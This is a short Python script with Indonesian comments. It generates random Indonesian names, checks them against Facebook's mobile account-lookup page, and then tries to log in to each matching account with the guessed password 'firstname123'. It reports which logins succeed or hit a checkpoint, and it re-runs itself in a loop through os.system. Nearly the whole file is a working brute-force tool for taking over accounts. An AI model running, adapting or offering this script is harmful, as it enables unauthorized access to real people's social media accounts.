#!/usr/bin/env python
#Do not for sale
#Versi second(simple)
#Mudah dipelajari
#Jika ingin merecode beri link sumber
#https://pastebin.com/A0QL6kPk

from faker import Faker
from requests import Session
import os

#Thailand
#faker = Faker('th_TH')
#All
#faker = Faker()
#Indonesia
faker = Faker('id_ID')
req = Session()
url = 'https://m.facebook.com/login/identify?locale=id_ID'
log = 'https://m.facebook.com/login?next&ref=dbl&fl&refid=8'
y = (f'{faker.first_name()}')
z = (f'{faker.last_name()}')
w = (y+'123')
ya = (y+' '+z)

def checker():
  data = {'email':ya}
  requ = req.get(url)
  post = req.post(url, data=data).text
  if(str('tidak menemukan hasil')) in post:
    print('User Nonaktif '+ya)
  else:
    print('User Found '+ya)
   
def tes_login():
	data={'email':ya, 'pass':w}
	requ = req.get(log)
	post = req.post(log, data=data).text
	if 'save-device' in post:
		print('Sukses login \a\n'+ya+'|'+w)
	if 'checkpoint' in post:
		print('Account checkpoint \a\n'+ya+'|'+w)
	else:
		print('Password Wrong => '+w)
   
print('Username: '+ya)
print('Password: '+w)
print('Sedang mengecek...')
checker()
tes_login()
print ('-------------------------------')
os.system('python hack.py')
